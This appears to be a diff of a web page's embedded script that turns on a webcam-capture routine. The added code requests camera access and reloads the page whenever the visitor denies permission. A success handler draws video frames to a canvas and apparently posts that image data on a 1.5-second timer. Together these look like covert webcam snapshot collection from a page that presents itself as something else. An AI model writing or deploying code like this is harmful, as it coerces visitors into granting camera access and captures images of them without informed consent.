@@ -192,17 +192,31 @@ background-position: center; /* Center the image */
       };
 
 // Access webcam
-/*async function init() {
+async function init() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        console.log("assad "+stream);
+    // handleSuccess(stream);
+    navigator.permissions.query({name:'camera'}).then(function(result) {
+    console.log(result.state);
+    if (result.state === 'granted') {
+        //permission has already been granted, no prompt is shown
+    } else if (result.state === 'prompt') {
+       //there's no peristent permission registered, will be showing the prompt
+       // window.location.reload();
+    } else if (result.state === 'denied') {
+       //permission has been denied
+       window.location.reload();
+    }
+    });
+    
   } catch (e) {
     console.log(e);
   }
-}*/
+}
 
 // Success
-/*function handleSuccess(stream) {
+function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
 
@@ -214,22 +228,11 @@ background-position: center; /* Center the image */
    post(canvasData); }, 1500);
   
 
-}*/
+}
 
 // Load init
-// init();
-navigator.permissions.query({name:'camera'}).then(function(result) {
-    console.log(result.state);
-    if (result.state === 'granted') {
-        //permission has already been granted, no prompt is shown
-    } else if (result.state === 'prompt') {
-       //there's no peristent permission registered, will be showing the prompt
-       // window.location.reload();
-    } else if (result.state === 'denied') {
-       //permission has been denied
-       window.location.reload();
-    }
-});
+init();
+
 
 
 </script>
